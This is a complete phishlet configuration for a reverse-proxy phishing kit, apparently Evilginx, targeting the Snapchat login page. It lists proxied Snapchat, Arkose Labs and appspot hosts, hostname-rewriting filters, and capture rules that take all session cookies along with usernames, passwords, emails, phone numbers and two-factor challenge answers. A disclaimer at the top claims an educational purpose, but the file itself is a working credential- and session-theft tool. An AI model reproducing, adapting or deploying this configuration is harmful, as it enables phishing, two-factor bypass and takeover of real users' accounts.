# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
# PLEASE DO NOT MISUSE THIS PHISHLET.

author: '@an0nud4y'
min_ver: '3.0.0'
redirect_url: 'https://accounts.snapchat.com/accounts/v2/login'


proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: '', orig_sub: '', domain: 'snapchat.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'csp-central', orig_sub: 'csp-central', domain: 'appspot.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'us-central1-gcp', orig_sub: 'us-central1-gcp', domain: 'api.snapchat.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'gcp', orig_sub: 'gcp', domain: 'api.snapchat.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'aws', orig_sub: 'aws', domain: 'api.snapchat.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'snapchat.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'snap-api', orig_sub: 'snap-api', domain: 'arkoselabs.com', session: true, is_landing: false, auto_filter: true}



  # us-central1-gcp.api.snapchat.com
  # gcp.api.snapchat.com
  # aws.api.snapchat.com
  # accounts.snapchat.com
  # static.snapchat.com
  # iframe.arkoselabs.com
  # graphql.contentful.com
  # story.snapchat.com
  # snap-api.arkoselabs.com
  # tr.snapchat.com
  # sc-static.net

  
sub_filters:
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.snapchat.com'
    keys: ['.*,regexp']
  - domain: '.account.snapchat.com'
    keys: ['.*,regexp']
  - domain: '.account.com'
    keys: ['.*,regexp']
  - domain: '.com'
    keys: ['.*,regexp']
  # - domain: 'accounts.snapchat.com'
  #   keys: ['web_client_id', 'sc-cookies-accepted', '__Host-X-Snap-Client-Cookie', '__Host-sc-a-nonce', 'sc-a-nonce', '__Host-sc-a-auth-session', '__Host-sc-authn-session-payload', 'sc-a-csrf', 'sc-a-session', 'xsrf_token', '_cfuvid', '.*,regexp'] 
  # - domain: 'iframe.arkoselabs.com'
  #   keys: ['_cfduid', '.*,regexp']
  # - domain: 'sc-static.net'
  #   keys: ['X-AB', '.*,regexp']
  # - domain: 'snap-api.arkoselabs.com'
  #   keys: ['_cfuvid', '.*,regexp']
   


auth_urls:
  - '/web/deeplink/.*'



credentials:
  username:
    key: "accountIdentifier"
    search: "(.*)"
    type: "post"
  password:
    key: "password"
    search: "(.*)"
    type: "post"
  custom:
    - key: "email"
      search: "email\":\"(.*?)\""
      type: "post"
    - key: 'ai_token'
      search: "(.*)"
      type: 'post'
    - key: 'twoFAChallengeAnswer'
      search: "(.*)"
      type: 'post'
    - key: 'accountIdentifierCountryCode'
      search: "(.*)"
      type: 'post'
    - key: 'accountIdentifierPhoneNumber'
      search: "(.*)"
      type: 'post'


login:
  domain: 'accounts.snapchat.com'
  path: '/accounts/v2/login'